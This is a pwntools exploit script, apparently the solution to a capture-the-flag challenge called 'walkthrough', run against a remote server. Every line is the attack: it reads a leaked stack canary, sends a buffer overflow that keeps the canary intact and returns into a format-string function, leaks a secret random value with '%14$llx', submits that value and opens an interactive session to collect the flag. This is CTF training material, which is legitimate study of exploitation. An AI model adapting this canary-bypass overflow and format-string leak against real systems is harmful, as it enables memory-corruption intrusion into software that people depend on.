from pwn import *

#init

e = ELF('./walkthrough')

context.binary = e

#p = process(e.path)
p = remote('147.182.172.217', 42001)

#vars

fmtstr = e.sym['fmtstr']

log.info('Fmtstr adr: ' + hex(fmtstr))

#exploit

#get canary

p.recvuntil('later): ')
canary = int(p.recvline(keepends = False), 16)

log.info('Canary: ' + hex(canary))

#rop to fmtstr and fill in canary

p.sendlineafter('stack.', b'a' * 72 + p64(canary) + b'a' * 8 + p64(fmtstr + 1))

#get random value with fmtstr

p.sendlineafter('printf.', '%14$llx')

p.recvuntil(':\n')
rand = int(p.recvline(keepends = False), 16)

log.info('Rand value: ' + hex(rand))

#input rand value

p.sendlineafter('guessing.', str(rand))

#pray for flag

p.interactive()
